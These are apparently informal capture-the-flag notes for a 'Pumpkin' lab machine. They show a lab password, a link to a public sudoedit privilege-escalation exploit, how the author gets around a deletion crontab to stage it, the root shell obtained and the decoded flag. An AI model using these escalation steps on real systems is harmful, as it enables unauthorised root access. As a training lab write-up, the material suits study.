Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.

ls /home/
goblin jack scarecrow

Hello Friend! I heard that you are looking for PumpkinGarden key. 
But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
You can reach there through my backyard.

Here is the key to my backyard
https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh

Wow!! A real privilege escalation! 
Writes a shell script to /tmp/sudoedit, adds execute privs, calls su.
How does this allow root?

Try to scp it into goblin's home directory, but it kept getting erased.
scp -P 3535 Downloads/38362.sh goblin@10.133.1.4:/home/goblin/privesc.sh

crontab -l (nothing)
sudo crontab -l (drake meme)

* * * * * rm /home/goblin/*.*
* * * * * sleep 15; rm /home/goblin/*.*
* * * * * sleep 30; rm /home/goblin/*.*
* * * * * rm /tmp/*
* * * * * sleep 15; rm /tmp/*
* * * * * sleep 30; rm /tmp/*

it's only deleting files (no -r)

mkdir ggnore

(kali) scp -P 3535 Downloads/38362.sh goblin@10.133.1.4:/home/goblin/ggnore/privesc.sh

privesc script says to pass in file you can modify as first arg

cd ggnore
touch hax
chmod +x privesc.sh
privesc.sh hax
...
ALEX-ALEX
root@Pumpkin:/tmp#

Boom! Root!

find / -name PumpkinGarden_key
nada

cd (home directory is assumed)
ls
PumpkinGarden_Key

cat PumpkinGarden_Key
base64 -d PumpkinGarden_Key
"Congratulations!"
